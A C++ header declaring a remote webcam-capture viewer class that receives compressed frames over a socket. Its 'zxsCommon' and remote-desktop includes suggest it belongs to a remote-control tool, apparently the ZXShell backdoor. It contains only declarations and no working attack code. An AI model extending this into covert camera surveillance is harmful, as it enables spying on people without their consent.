#if !defined _CAPVIEWER
#define _CAPVIEWER


#include "..\main.h"
#include "..\..\zxsCommon\zlib\zlib.h"
#include "..\remotedesktop\rdViewer\sock.h"
#include "..\..\zxsCommon\RDP.h"
#include "..\..\zxsCommon\rdpBuffer.h"
#include "..\..\zxsCommon\rdpBufferEncodeZlib.h"
#include "..\..\zxsCommon\CSocketData.h"
#include "..\..\zxsCommon\CSpeedTest.h"
#include "..\..\zxsCommon\CAPP.h"

#include "..\bmp2file.h"



#pragma pack(push, 1)


typedef struct _CAPDRV
{
	int bExisted;
	char szDeviceName[80];
	char szDeviceVersion[80];
	_CAPDRV()
	{
		memset(this, 0, sizeof(struct _CAPDRV));
	}
}CAPDRV;

class capDrvDes
{
protected:
	int idx;
	int capIndex;
public:
	bool bUpdated;
	CAPDRV capDrv[10];
public:
	capDrvDes();
	~capDrvDes();
	int GetIndex(){ return capIndex;}
	CAPDRV * GetNextDriver();


};

#pragma pack(pop)


class CcapViewer
{

protected:
	HWND m_hwnd;
	SOCKET m_socket;
	BITMAPINFO *pbiBitInfo;
	_BMPINFO BI;

	CSocketData sockdata;
	_tagRDPHEAD rdph;
	_rdpBuffer bmpbuf;
	_rdpBuffer bmpbuf1;
	_rdpBuffer zbmpbuf;

	float CAPPVersion;

	int runFlag;
	int stopping;
	HANDLE hThread;
	DWORD dwThreadId;

public:
	capDrvDes capDrivers;

public:
	CcapViewer(SOCKET s, HWND hwnd);
	~CcapViewer();

	SOCKET GetSocket(){ return m_socket;}

	static DWORD WINAPI _capRecvMessage(LPVOID lParam);
	DWORD WINAPI capRecvMessage(LPVOID lParam);
	BOOL NewWorkThread();
	BOOL SetCapDevice(int idx);

	BOOL CaptureStop();

	BYTE *GetDibBuf();
	BITMAPINFO *GetBmpInfo();

	BOOL bRoutineExited(){ return runFlag==0;};
	BOOL start();
	BOOL stop();
};


#endif